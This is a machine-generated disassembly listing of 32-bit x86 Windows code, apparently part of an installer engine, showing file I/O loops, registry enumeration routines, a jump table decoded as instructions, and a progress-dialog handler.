  402501:	e9 a0 f0 ff ff       	jmp    0x4015a6
  402506:	6a 02                	push   $0x2
  402508:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40250b:	e8 c9 04 00 00       	call   0x4029d9
  402510:	83 f8 01             	cmp    $0x1,%eax
  402513:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402516:	0f 8c 6f 03 00 00    	jl     0x40288b
  40251c:	b9 ff 1f 00 00       	mov    $0x1fff,%ecx
  402521:	3b c1                	cmp    %ecx,%eax
  402523:	7e 03                	jle    0x402528
  402525:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  402528:	38 1e                	cmp    %bl,(%esi)
  40252a:	0f 84 8e 00 00 00    	je     0x4025be
  402530:	56                   	push   %esi
  402531:	88 5d 0b             	mov    %bl,0xb(%ebp)
  402534:	e8 4a 34 00 00       	call   0x405983
  402539:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  40253c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40253f:	7e 7d                	jle    0x4025be
  402541:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402544:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402547:	53                   	push   %ebx
  402548:	50                   	push   %eax
  402549:	8d 45 f7             	lea    -0x9(%ebp),%eax
  40254c:	6a 01                	push   $0x1
  40254e:	50                   	push   %eax
  40254f:	ff 75 f8             	push   -0x8(%ebp)
  402552:	ff 15 2c 71 40 00    	call   *0x40712c
  402558:	85 c0                	test   %eax,%eax
  40255a:	74 65                	je     0x4025c1
  40255c:	83 7d d0 01          	cmpl   $0x1,-0x30(%ebp)
  402560:	75 5f                	jne    0x4025c1
  402562:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402565:	75 21                	jne    0x402588
  402567:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  40256b:	74 2b                	je     0x402598
  40256d:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  402571:	74 25                	je     0x402598
  402573:	8a 45 f7             	mov    -0x9(%ebp),%al
  402576:	88 04 3e             	mov    %al,(%esi,%edi,1)
  402579:	46                   	inc    %esi
  40257a:	3a c3                	cmp    %bl,%al
  40257c:	88 45 0b             	mov    %al,0xb(%ebp)
  40257f:	74 40                	je     0x4025c1
  402581:	3b 75 cc             	cmp    -0x34(%ebp),%esi
  402584:	7c be                	jl     0x402544
  402586:	eb 39                	jmp    0x4025c1
  402588:	0f b6 45 f7          	movzbl -0x9(%ebp),%eax
  40258c:	50                   	push   %eax
  40258d:	57                   	push   %edi
  40258e:	e8 d7 33 00 00       	call   0x40596a
  402593:	e9 fc 02 00 00       	jmp    0x402894
  402598:	8a 45 f7             	mov    -0x9(%ebp),%al
  40259b:	38 45 0b             	cmp    %al,0xb(%ebp)
  40259e:	74 0e                	je     0x4025ae
  4025a0:	3c 0d                	cmp    $0xd,%al
  4025a2:	74 04                	je     0x4025a8
  4025a4:	3c 0a                	cmp    $0xa,%al
  4025a6:	75 06                	jne    0x4025ae
  4025a8:	88 04 3e             	mov    %al,(%esi,%edi,1)
  4025ab:	46                   	inc    %esi
  4025ac:	eb 13                	jmp    0x4025c1
  4025ae:	6a 01                	push   $0x1
  4025b0:	53                   	push   %ebx
  4025b1:	6a ff                	push   $0xffffffff
  4025b3:	ff 75 f8             	push   -0x8(%ebp)
  4025b6:	ff 15 34 71 40 00    	call   *0x407134
  4025bc:	eb 03                	jmp    0x4025c1
  4025be:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  4025c1:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  4025c4:	3b f3                	cmp    %ebx,%esi
  4025c6:	e9 dd ef ff ff       	jmp    0x4015a8
  4025cb:	38 1e                	cmp    %bl,(%esi)
  4025cd:	0f 84 b8 02 00 00    	je     0x40288b
  4025d3:	ff 75 e8             	push   -0x18(%ebp)
  4025d6:	53                   	push   %ebx
  4025d7:	6a 02                	push   $0x2
  4025d9:	e8 fb 03 00 00       	call   0x4029d9
  4025de:	50                   	push   %eax
  4025df:	56                   	push   %esi
  4025e0:	e8 9e 33 00 00       	call   0x405983
  4025e5:	50                   	push   %eax
  4025e6:	ff 15 34 71 40 00    	call   *0x407134
  4025ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025ef:	0f 8c 96 02 00 00    	jl     0x40288b
  4025f5:	e9 37 02 00 00       	jmp    0x402831
  4025fa:	38 1e                	cmp    %bl,(%esi)
  4025fc:	0f 84 89 02 00 00    	je     0x40288b
  402602:	56                   	push   %esi
  402603:	e8 7b 33 00 00       	call   0x405983
  402608:	50                   	push   %eax
  402609:	ff 15 38 71 40 00    	call   *0x407138
  40260f:	e9 77 02 00 00       	jmp    0x40288b
  402614:	38 1f                	cmp    %bl,(%edi)
  402616:	74 18                	je     0x402630
  402618:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  40261e:	50                   	push   %eax
  40261f:	57                   	push   %edi
  402620:	e8 5e 33 00 00       	call   0x405983
  402625:	50                   	push   %eax
  402626:	ff 15 3c 71 40 00    	call   *0x40713c
  40262c:	85 c0                	test   %eax,%eax
  40262e:	75 3f                	jne    0x40266f
  402630:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402637:	88 1e                	mov    %bl,(%esi)
  402639:	e9 4d 02 00 00       	jmp    0x40288b
  40263e:	6a 02                	push   $0x2
  402640:	e8 b1 03 00 00       	call   0x4029f6
  402645:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  40264b:	51                   	push   %ecx
  40264c:	50                   	push   %eax
  40264d:	ff 15 40 71 40 00    	call   *0x407140
  402653:	83 f8 ff             	cmp    $0xffffffff,%eax
  402656:	75 10                	jne    0x402668
  402658:	88 1f                	mov    %bl,(%edi)
  40265a:	88 1e                	mov    %bl,(%esi)
  40265c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402663:	e9 23 02 00 00       	jmp    0x40288b
  402668:	50                   	push   %eax
  402669:	57                   	push   %edi
  40266a:	e8 fb 32 00 00       	call   0x40596a
  40266f:	8d 85 88 fe ff ff    	lea    -0x178(%ebp),%eax
  402675:	50                   	push   %eax
  402676:	56                   	push   %esi
  402677:	e9 35 01 00 00       	jmp    0x4027b1
  40267c:	6a f0                	push   $0xfffffff0
  40267e:	c7 45 f8 66 fd ff ff 	movl   $0xfffffd66,-0x8(%ebp)
  402685:	e8 6c 03 00 00       	call   0x4029f6
  40268a:	8b f0                	mov    %eax,%esi
  40268c:	56                   	push   %esi
  40268d:	89 75 bc             	mov    %esi,-0x44(%ebp)
  402690:	e8 d7 2e 00 00       	call   0x40556c
  402695:	85 c0                	test   %eax,%eax
  402697:	75 07                	jne    0x4026a0
  402699:	6a ed                	push   $0xffffffed
  40269b:	e8 56 03 00 00       	call   0x4029f6
  4026a0:	56                   	push   %esi
  4026a1:	e8 1e 30 00 00       	call   0x4056c4
  4026a6:	6a 02                	push   $0x2
  4026a8:	68 00 00 00 40       	push   $0x40000000
  4026ad:	56                   	push   %esi
  4026ae:	e8 30 30 00 00       	call   0x4056e3
  4026b3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4026b6:	89 45 08             	mov    %eax,0x8(%ebp)
  4026b9:	0f 84 9d 00 00 00    	je     0x40275c
  4026bf:	a1 74 1b 45 00       	mov    0x451b74,%eax
  4026c4:	8b 35 00 71 40 00    	mov    0x407100,%esi
  4026ca:	50                   	push   %eax
  4026cb:	6a 40                	push   $0x40
  4026cd:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4026d0:	ff d6                	call   *%esi
  4026d2:	8b f8                	mov    %eax,%edi
  4026d4:	3b fb                	cmp    %ebx,%edi
  4026d6:	74 7b                	je     0x402753
  4026d8:	53                   	push   %ebx
  4026d9:	e8 d1 09 00 00       	call   0x4030af
  4026de:	ff 75 d4             	push   -0x2c(%ebp)
  4026e1:	57                   	push   %edi
  4026e2:	e8 96 09 00 00       	call   0x40307d
  4026e7:	ff 75 e4             	push   -0x1c(%ebp)
  4026ea:	6a 40                	push   $0x40
  4026ec:	ff d6                	call   *%esi
  4026ee:	8b f0                	mov    %eax,%esi
  4026f0:	3b f3                	cmp    %ebx,%esi
  4026f2:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4026f5:	74 34                	je     0x40272b
  4026f7:	ff 75 e4             	push   -0x1c(%ebp)
  4026fa:	56                   	push   %esi
  4026fb:	53                   	push   %ebx
  4026fc:	ff 75 e0             	push   -0x20(%ebp)
  4026ff:	e8 57 07 00 00       	call   0x402e5b
  402704:	eb 18                	jmp    0x40271e
  402706:	8b 0e                	mov    (%esi),%ecx
  402708:	8b 46 04             	mov    0x4(%esi),%eax
  40270b:	83 c6 08             	add    $0x8,%esi
  40270e:	51                   	push   %ecx
  40270f:	03 c7                	add    %edi,%eax
  402711:	56                   	push   %esi
  402712:	50                   	push   %eax
  402713:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  402716:	e8 89 2f 00 00       	call   0x4056a4
  40271b:	03 75 c8             	add    -0x38(%ebp),%esi
  40271e:	38 1e                	cmp    %bl,(%esi)
  402720:	75 e4                	jne    0x402706
  402722:	ff 75 d0             	push   -0x30(%ebp)
  402725:	ff 15 fc 70 40 00    	call   *0x4070fc
  40272b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40272e:	53                   	push   %ebx
  40272f:	50                   	push   %eax
  402730:	ff 75 d4             	push   -0x2c(%ebp)
  402733:	57                   	push   %edi
  402734:	ff 75 08             	push   0x8(%ebp)
  402737:	ff 15 28 71 40 00    	call   *0x407128
  40273d:	57                   	push   %edi
  40273e:	ff 15 fc 70 40 00    	call   *0x4070fc
  402744:	53                   	push   %ebx
  402745:	53                   	push   %ebx
  402746:	ff 75 08             	push   0x8(%ebp)
  402749:	6a ff                	push   $0xffffffff
  40274b:	e8 0b 07 00 00       	call   0x402e5b
  402750:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402753:	ff 75 08             	push   0x8(%ebp)
  402756:	ff 15 ec 70 40 00    	call   *0x4070ec
  40275c:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40275f:	6a f3                	push   $0xfffffff3
  402761:	5e                   	pop    %esi
  402762:	7d 13                	jge    0x402777
  402764:	6a ef                	push   $0xffffffef
  402766:	5e                   	pop    %esi
  402767:	ff 75 bc             	push   -0x44(%ebp)
  40276a:	ff 15 44 71 40 00    	call   *0x407144
  402770:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402777:	56                   	push   %esi
  402778:	e9 e7 f9 ff ff       	jmp    0x402164
  40277d:	53                   	push   %ebx
  40277e:	e8 56 02 00 00       	call   0x4029d9
  402783:	3b 05 8c 1b 45 00    	cmp    0x451b8c,%eax
  402789:	89 45 08             	mov    %eax,0x8(%ebp)
  40278c:	0f 83 ca fe ff ff    	jae    0x40265c
  402792:	8b f0                	mov    %eax,%esi
  402794:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402797:	69 f6 18 20 00 00    	imul   $0x2018,%esi,%esi
  40279d:	03 35 88 1b 45 00    	add    0x451b88,%esi
  4027a3:	3b c3                	cmp    %ebx,%eax
  4027a5:	7c 17                	jl     0x4027be
  4027a7:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  4027aa:	75 0f                	jne    0x4027bb
  4027ac:	83 c6 18             	add    $0x18,%esi
  4027af:	56                   	push   %esi
  4027b0:	57                   	push   %edi
  4027b1:	e8 56 32 00 00       	call   0x405a0c
  4027b6:	e9 d0 00 00 00       	jmp    0x40288b
  4027bb:	51                   	push   %ecx
  4027bc:	eb 74                	jmp    0x402832
  4027be:	83 c9 ff             	or     $0xffffffff,%ecx
  4027c1:	2b c8                	sub    %eax,%ecx
  4027c3:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4027c6:	74 0c                	je     0x4027d4
  4027c8:	6a 01                	push   $0x1
  4027ca:	e8 0a 02 00 00       	call   0x4029d9
  4027cf:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4027d2:	eb 10                	jmp    0x4027e4
  4027d4:	ff 75 ec             	push   -0x14(%ebp)
  4027d7:	8d 46 18             	lea    0x18(%esi),%eax
  4027da:	50                   	push   %eax
  4027db:	e8 4e 32 00 00       	call   0x405a2e
  4027e0:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  4027e4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4027e7:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4027ea:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  4027ed:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4027f0:	0f 84 95 00 00 00    	je     0x40288b
  4027f6:	ff 75 08             	push   0x8(%ebp)
  4027f9:	e8 7f e9 ff ff       	call   0x40117d
  4027fe:	e9 88 00 00 00       	jmp    0x40288b
  402803:	53                   	push   %ebx
  402804:	e8 d0 01 00 00       	call   0x4029d9
  402809:	83 f8 20             	cmp    $0x20,%eax
  40280c:	0f 83 4a fe ff ff    	jae    0x40265c
  402812:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402815:	74 23                	je     0x40283a
  402817:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40281a:	74 0f                	je     0x40282b
  40281c:	50                   	push   %eax
  40281d:	e8 77 ea ff ff       	call   0x401299
  402822:	53                   	push   %ebx
  402823:	53                   	push   %ebx
  402824:	e8 c6 e9 ff ff       	call   0x4011ef
  402829:	eb 60                	jmp    0x40288b
  40282b:	53                   	push   %ebx
  40282c:	e8 b1 ea ff ff       	call   0x4012e2
  402831:	50                   	push   %eax
  402832:	57                   	push   %edi
  402833:	e8 32 31 00 00       	call   0x40596a
  402838:	eb 51                	jmp    0x40288b
  40283a:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40283d:	74 12                	je     0x402851
  40283f:	8b 15 70 1b 45 00    	mov    0x451b70,%edx
  402845:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402848:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  40284f:	eb 3a                	jmp    0x40288b
  402851:	8b 0d 70 1b 45 00    	mov    0x451b70,%ecx
  402857:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  40285e:	57                   	push   %edi
  40285f:	e8 ca 31 00 00       	call   0x405a2e
  402864:	eb 25                	jmp    0x40288b
  402866:	8b 0d e0 37 44 00    	mov    0x4437e0,%ecx
  40286c:	53                   	push   %ebx
  40286d:	23 c8                	and    %eax,%ecx
  40286f:	51                   	push   %ecx
  402870:	6a 0b                	push   $0xb
  402872:	ff 75 cc             	push   -0x34(%ebp)
  402875:	ff 15 44 72 40 00    	call   *0x407244
  40287b:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40287e:	74 0b                	je     0x40288b
  402880:	53                   	push   %ebx
  402881:	53                   	push   %ebx
  402882:	ff 75 cc             	push   -0x34(%ebp)
  402885:	ff 15 40 72 40 00    	call   *0x407240
  40288b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40288e:	01 05 e8 1b 45 00    	add    %eax,0x451be8
  402894:	33 c0                	xor    %eax,%eax
  402896:	5f                   	pop    %edi
  402897:	5e                   	pop    %esi
  402898:	5b                   	pop    %ebx
  402899:	c9                   	leave
  40289a:	c2 04 00             	ret    $0x4
  40289d:	96                   	xchg   %eax,%esi
  40289e:	28 40 00             	sub    %al,0x0(%eax)
  4028a1:	90                   	nop
  4028a2:	14 40                	adc    $0x40,%al
  4028a4:	00 9c 14 40 00 b7 14 	add    %bl,0x14b70040(%esp,%edx,1)
  4028ab:	40                   	inc    %eax
  4028ac:	00 ca                	add    %cl,%dl
  4028ae:	14 40                	adc    $0x40,%al
  4028b0:	00 d6                	add    %dl,%dh
  4028b2:	14 40                	adc    $0x40,%al
  4028b4:	00 f0                	add    %dh,%al
  4028b6:	14 40                	adc    $0x40,%al
  4028b8:	00 67 15             	add    %ah,0x15(%edi)
  4028bb:	40                   	inc    %eax
  4028bc:	00 95 15 40 00 b3    	add    %dl,-0x4cffbfeb(%ebp)
  4028c2:	15 40 00 34 16       	adc    $0x16340040,%eax
  4028c7:	40                   	inc    %eax
  4028c8:	00 fe                	add    %bh,%dh
  4028ca:	14 40                	adc    $0x40,%al
  4028cc:	00 39                	add    %bh,(%ecx)
  4028ce:	15 40 00 5a 15       	adc    $0x155a0040,%eax
  4028d3:	40                   	inc    %eax
  4028d4:	00 45 16             	add    %al,0x16(%ebp)
  4028d7:	40                   	inc    %eax
  4028d8:	00 96 16 40 00 fa    	add    %dl,-0x5ffbfea(%esi)
  4028de:	16                   	push   %ss
  4028df:	40                   	inc    %eax
  4028e0:	00 21                	add    %ah,(%ecx)
  4028e2:	17                   	pop    %ss
  4028e3:	40                   	inc    %eax
  4028e4:	00 34 17             	add    %dh,(%edi,%edx,1)
  4028e7:	40                   	inc    %eax
  4028e8:	00 d8                	add    %bl,%al
  4028ea:	18 40 00             	sbb    %al,0x0(%eax)
  4028ed:	db 18                	fistpl (%eax)
  4028ef:	40                   	inc    %eax
  4028f0:	00 0d 19 40 00 22    	add    %cl,0x22004019
  4028f6:	19 40 00             	sbb    %eax,0x0(%eax)
  4028f9:	34 19                	xor    $0x19,%al
  4028fb:	40                   	inc    %eax
  4028fc:	00 b5 19 40 00 e6    	add    %dh,-0x19ffbfe7(%ebp)
  402902:	19 40 00             	sbb    %eax,0x0(%eax)
  402905:	26 1a 40 00          	sbb    %es:0x0(%eax),%al
  402909:	58                   	pop    %eax
  40290a:	1a 40 00             	sbb    0x0(%eax),%al
  40290d:	e5 1a                	in     $0x1a,%eax
  40290f:	40                   	inc    %eax
  402910:	00 06                	add    %al,(%esi)
  402912:	1b 40 00             	sbb    0x0(%eax),%eax
  402915:	ad                   	lods   %ds:(%esi),%eax
  402916:	1b 40 00             	sbb    0x0(%eax),%eax
  402919:	ad                   	lods   %ds:(%esi),%eax
  40291a:	1b 40 00             	sbb    0x0(%eax),%eax
  40291d:	6d                   	insl   (%dx),%es:(%edi)
  40291e:	1c 40                	sbb    $0x40,%al
  402920:	00 8a 1c 40 00 a5    	add    %cl,-0x5affbfe4(%edx)
  402926:	1c 40                	sbb    $0x40,%al
  402928:	00 c1                	add    %al,%cl
  40292a:	1c 40                	sbb    $0x40,%al
  40292c:	00 1b                	add    %bl,(%ebx)
  40292e:	1d 40 00 95 1d       	sbb    $0x1d950040,%eax
  402933:	40                   	inc    %eax
  402934:	00 c1                	add    %al,%cl
  402936:	1d 40 00 1b 1e       	sbb    $0x1e1b0040,%eax
  40293b:	40                   	inc    %eax
  40293c:	00 95 1e 40 00 c5    	add    %dl,-0x3affbfe2(%ebp)
  402942:	1e                   	push   %ds
  402943:	40                   	inc    %eax
  402944:	00 50 1f             	add    %dl,0x1f(%eax)
  402947:	40                   	inc    %eax
  402948:	00 20                	add    %ah,(%eax)
  40294a:	20 40 00             	and    %al,0x0(%eax)
  40294d:	72 21                	jb     0x402970
  40294f:	40                   	inc    %eax
  402950:	00 f4                	add    %dh,%ah
  402952:	21 40 00             	and    %eax,0x0(%eax)
  402955:	23 22                	and    (%edx),%esp
  402957:	40                   	inc    %eax
  402958:	00 67 22             	add    %ah,0x22(%edi)
  40295b:	40                   	inc    %eax
  40295c:	00 a7 22 40 00 03    	add    %ah,0x3004022(%edi)
  402962:	23 40 00             	and    0x0(%eax),%eax
  402965:	af                   	scas   %es:(%edi),%eax
  402966:	23 40 00             	and    0x0(%eax),%eax
  402969:	27                   	daa
  40296a:	24 40                	and    $0x40,%al
  40296c:	00 88 24 40 00 9c    	add    %cl,-0x63ffbfdc(%eax)
  402972:	24 40                	and    $0x40,%al
  402974:	00 be 24 40 00 06    	add    %bh,0x6004024(%esi)
  40297a:	25 40 00 cb 25       	and    $0x25cb0040,%eax
  40297f:	40                   	inc    %eax
  402980:	00 fa                	add    %bh,%dl
  402982:	25 40 00 14 26       	and    $0x26140040,%eax
  402987:	40                   	inc    %eax
  402988:	00 3e                	add    %bh,(%esi)
  40298a:	26 40                	es inc %eax
  40298c:	00 7c 26 40          	add    %bh,0x40(%esi,%eiz,1)
  402990:	00 7d 27             	add    %bh,0x27(%ebp)
  402993:	40                   	inc    %eax
  402994:	00 03                	add    %al,(%ebx)
  402996:	28 40 00             	sub    %al,0x0(%eax)
  402999:	8b 28                	mov    (%eax),%ebp
  40299b:	40                   	inc    %eax
  40299c:	00 8b 28 40 00 66    	add    %cl,0x66004028(%ebx)
  4029a2:	28 40 00             	sub    %al,0x0(%eax)
  4029a5:	79 1a                	jns    0x4029c1
  4029a7:	40                   	inc    %eax
  4029a8:	00 7d 1a             	add    %bh,0x1a(%ebp)
  4029ab:	40                   	inc    %eax
  4029ac:	00 81 1a 40 00 88    	add    %al,-0x77ffbfe6(%ecx)
  4029b2:	1a 40 00             	sbb    0x0(%eax),%al
  4029b5:	95                   	xchg   %eax,%ebp
  4029b6:	1a 40 00             	sbb    0x0(%eax),%al
  4029b9:	99                   	cltd
  4029ba:	1a 40 00             	sbb    0x0(%eax),%al
  4029bd:	9d                   	popf
  4029be:	1a 40 00             	sbb    0x0(%eax),%al
  4029c1:	a1 1a 40 00 aa       	mov    0xaa00401a,%eax
  4029c6:	1a 40 00             	sbb    0x0(%eax),%al
  4029c9:	b4 1a                	mov    $0x1a,%ah
  4029cb:	40                   	inc    %eax
  4029cc:	00 c1                	add    %al,%cl
  4029ce:	1a 40 00             	sbb    0x0(%eax),%al
  4029d1:	d9 1a                	fstps  (%edx)
  4029d3:	40                   	inc    %eax
  4029d4:	00 dd                	add    %bl,%ch
  4029d6:	1a 40 00             	sbb    0x0(%eax),%al
  4029d9:	8b 44 24 04          	mov    0x4(%esp),%eax
  4029dd:	8b 0d 78 9b 40 00    	mov    0x409b78,%ecx
  4029e3:	ff 34 81             	push   (%ecx,%eax,4)
  4029e6:	6a 00                	push   $0x0
  4029e8:	e8 41 30 00 00       	call   0x405a2e
  4029ed:	50                   	push   %eax
  4029ee:	e8 90 2f 00 00       	call   0x405983
  4029f3:	c2 04 00             	ret    $0x4
  4029f6:	56                   	push   %esi
  4029f7:	8b 74 24 08          	mov    0x8(%esp),%esi
  4029fb:	85 f6                	test   %esi,%esi
  4029fd:	57                   	push   %edi
  4029fe:	8b c6                	mov    %esi,%eax
  402a00:	7d 02                	jge    0x402a04
  402a02:	f7 d8                	neg    %eax
  402a04:	8b 15 78 9b 40 00    	mov    0x409b78,%edx
  402a0a:	8b c8                	mov    %eax,%ecx
  402a0c:	83 e1 0f             	and    $0xf,%ecx
  402a0f:	c1 f8 04             	sar    $0x4,%eax
  402a12:	ff 34 8a             	push   (%edx,%ecx,4)
  402a15:	c1 e0 0d             	shl    $0xd,%eax
  402a18:	05 80 9b 40 00       	add    $0x409b80,%eax
  402a1d:	50                   	push   %eax
  402a1e:	e8 0b 30 00 00       	call   0x405a2e
  402a23:	85 f6                	test   %esi,%esi
  402a25:	8b f8                	mov    %eax,%edi
  402a27:	7d 06                	jge    0x402a2f
  402a29:	57                   	push   %edi
  402a2a:	e8 3f 32 00 00       	call   0x405c6e
  402a2f:	8b c7                	mov    %edi,%eax
  402a31:	5f                   	pop    %edi
  402a32:	5e                   	pop    %esi
  402a33:	c2 04 00             	ret    $0x4
  402a36:	55                   	push   %ebp
  402a37:	8b ec                	mov    %esp,%ebp
  402a39:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402a3f:	53                   	push   %ebx
  402a40:	56                   	push   %esi
  402a41:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402a44:	57                   	push   %edi
  402a45:	50                   	push   %eax
  402a46:	a1 10 1c 45 00       	mov    0x451c10,%eax
  402a4b:	0c 08                	or     $0x8,%al
  402a4d:	33 db                	xor    %ebx,%ebx
  402a4f:	50                   	push   %eax
  402a50:	53                   	push   %ebx
  402a51:	ff 75 0c             	push   0xc(%ebp)
  402a54:	ff 75 08             	push   0x8(%ebp)
  402a57:	ff 15 10 70 40 00    	call   *0x407010
  402a5d:	3b c3                	cmp    %ebx,%eax
  402a5f:	75 69                	jne    0x402aca
  402a61:	8b 35 08 70 40 00    	mov    0x407008,%esi
  402a67:	bf 05 01 00 00       	mov    $0x105,%edi
  402a6c:	eb 19                	jmp    0x402a87
  402a6e:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  402a71:	75 4b                	jne    0x402abe
  402a73:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402a79:	53                   	push   %ebx
  402a7a:	50                   	push   %eax
  402a7b:	ff 75 fc             	push   -0x4(%ebp)
  402a7e:	e8 b3 ff ff ff       	call   0x402a36
  402a83:	85 c0                	test   %eax,%eax
  402a85:	75 12                	jne    0x402a99
  402a87:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402a8d:	57                   	push   %edi
  402a8e:	50                   	push   %eax
  402a8f:	53                   	push   %ebx
  402a90:	ff 75 fc             	push   -0x4(%ebp)
  402a93:	ff d6                	call   *%esi
  402a95:	85 c0                	test   %eax,%eax
  402a97:	74 d5                	je     0x402a6e
  402a99:	ff 75 fc             	push   -0x4(%ebp)
  402a9c:	ff 15 1c 70 40 00    	call   *0x40701c
  402aa2:	6a 02                	push   $0x2
  402aa4:	e8 85 32 00 00       	call   0x405d2e
  402aa9:	3b c3                	cmp    %ebx,%eax
  402aab:	74 24                	je     0x402ad1
  402aad:	53                   	push   %ebx
  402aae:	ff 35 10 1c 45 00    	push   0x451c10
  402ab4:	ff 75 0c             	push   0xc(%ebp)
  402ab7:	ff 75 08             	push   0x8(%ebp)
  402aba:	ff d0                	call   *%eax
  402abc:	eb 0c                	jmp    0x402aca
  402abe:	ff 75 fc             	push   -0x4(%ebp)
  402ac1:	ff 15 1c 70 40 00    	call   *0x40701c
  402ac7:	33 c0                	xor    %eax,%eax
  402ac9:	40                   	inc    %eax
  402aca:	5f                   	pop    %edi
  402acb:	5e                   	pop    %esi
  402acc:	5b                   	pop    %ebx
  402acd:	c9                   	leave
  402ace:	c2 0c 00             	ret    $0xc
  402ad1:	39 1d 10 1c 45 00    	cmp    %ebx,0x451c10
  402ad7:	75 ee                	jne    0x402ac7
  402ad9:	ff 75 0c             	push   0xc(%ebp)
  402adc:	ff 75 08             	push   0x8(%ebp)
  402adf:	ff 15 14 70 40 00    	call   *0x407014
  402ae5:	85 c0                	test   %eax,%eax
  402ae7:	75 de                	jne    0x402ac7
  402ae9:	eb df                	jmp    0x402aca
  402aeb:	8b 44 24 04          	mov    0x4(%esp),%eax
  402aef:	85 c0                	test   %eax,%eax
  402af1:	75 0a                	jne    0x402afd
  402af3:	a1 e4 1b 45 00       	mov    0x451be4,%eax
  402af8:	05 01 00 00 80       	add    $0x80000001,%eax
  402afd:	c2 04 00             	ret    $0x4
  402b00:	55                   	push   %ebp
  402b01:	8b ec                	mov    %esp,%ebp
  402b03:	8d 45 08             	lea    0x8(%ebp),%eax
  402b06:	50                   	push   %eax
  402b07:	a1 10 1c 45 00       	mov    0x451c10,%eax
  402b0c:	0b 45 08             	or     0x8(%ebp),%eax
  402b0f:	50                   	push   %eax
  402b10:	6a 00                	push   $0x0
  402b12:	6a 22                	push   $0x22
  402b14:	e8 dd fe ff ff       	call   0x4029f6
  402b19:	50                   	push   %eax
  402b1a:	a1 78 9b 40 00       	mov    0x409b78,%eax
  402b1f:	ff 70 04             	push   0x4(%eax)
  402b22:	e8 c4 ff ff ff       	call   0x402aeb
  402b27:	50                   	push   %eax
  402b28:	ff 15 10 70 40 00    	call   *0x407010
  402b2e:	f7 d8                	neg    %eax
  402b30:	1b c0                	sbb    %eax,%eax
  402b32:	f7 d0                	not    %eax
  402b34:	23 45 08             	and    0x8(%ebp),%eax
  402b37:	5d                   	pop    %ebp
  402b38:	c2 04 00             	ret    $0x4
  402b3b:	55                   	push   %ebp
  402b3c:	8b ec                	mov    %esp,%ebp
  402b3e:	83 ec 40             	sub    $0x40,%esp
  402b41:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402b48:	75 19                	jne    0x402b63
  402b4a:	6a 00                	push   $0x0
  402b4c:	68 fa 00 00 00       	push   $0xfa
  402b51:	6a 01                	push   $0x1
  402b53:	ff 75 08             	push   0x8(%ebp)
  402b56:	ff 15 f0 71 40 00    	call   *0x4071f0
  402b5c:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402b63:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402b6a:	75 4c                	jne    0x402bb8
  402b6c:	8b 0d 80 d7 41 00    	mov    0x41d780,%ecx
  402b72:	a1 90 17 43 00       	mov    0x431790,%eax
  402b77:	3b c8                	cmp    %eax,%ecx
  402b79:	7c 02                	jl     0x402b7d
  402b7b:	8b c8                	mov    %eax,%ecx
  402b7d:	50                   	push   %eax
  402b7e:	6a 64                	push   $0x64
  402b80:	51                   	push   %ecx
  402b81:	ff 15 30 71 40 00    	call   *0x407130
  402b87:	50                   	push   %eax
  402b88:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402b8b:	68 18 90 40 00       	push   $0x409018
  402b90:	50                   	push   %eax
  402b91:	ff 15 00 72 40 00    	call   *0x407200
  402b97:	83 c4 0c             	add    $0xc,%esp
  402b9a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402b9d:	50                   	push   %eax
  402b9e:	ff 75 08             	push   0x8(%ebp)
  402ba1:	ff 15 f4 71 40 00    	call   *0x4071f4
  402ba7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402baa:	50                   	push   %eax
  402bab:	68 06 04 00 00       	push   $0x406
  402bb0:	ff 75 08             	push   0x8(%ebp)
  402bb3:	e8 f3 26 00 00       	call   0x4052ab
